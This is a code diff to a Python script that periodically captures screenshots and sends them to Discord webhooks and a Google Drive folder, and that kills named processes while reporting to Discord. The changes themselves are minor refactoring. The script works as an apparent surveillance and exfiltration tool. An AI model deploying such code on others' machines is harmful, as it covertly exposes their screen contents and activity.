@@ -33,7 +33,6 @@ userhome = os.path.expanduser('~')
 SS_URL = os.getenv('DISCORD_SS_URL')
 LOG_URL = os.getenv('DISCORD_LOG_URL')
 
-
 def send_msg_on_discord(msg, is_file=False):
     
     content = f'{userhome} - {datetime.now()}' if is_file else msg
@@ -42,12 +41,12 @@ def send_msg_on_discord(msg, is_file=False):
         webhook.add_file(file=open(msg, 'rb').read(), filename=msg)
     response = webhook.execute()
         
-def upload_file_on_google_drive(file_path, folder_id):
+def upload_file_on_google_drive(file_path):
 
     creds = Credentials.from_service_account_file(os.getenv('CREDENTIALS_FILE')) #################### Your Google Service Account Credentials
     service = build('drive', 'v3', credentials=creds)
-
     folder_id = os.getenv('FOLDER_ID')                                                       #################### Google Drive Folder
+
     file_name = os.path.basename(file_path)
 
     file_metadata = {
@@ -116,7 +115,8 @@ def kill_process_by_name(name):
                 proc.terminate()  # Terminate the process
                 proc.wait()  # Wait for the process to terminate
                 send_msg_on_discord(f"Process {proc.info['name']} (PID {proc.info['pid']}) terminated.")
-        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
+            send_msg_on_discord(e)
             # Ignore processes that no longer exist or are inaccessible
             continue
 
@@ -191,7 +191,7 @@ async def take_screenshot_periodically():
                 except Exception as e:
                     print(e)
                     print('Uploading file on google drive...', filename)
-                    upload_file_on_google_drive(filename, folder_id);os.unlink(filename)                    
+                    upload_file_on_google_drive(filename);os.unlink(filename)                    
         except Exception as e:
             print(e)
         print('sleeping...')
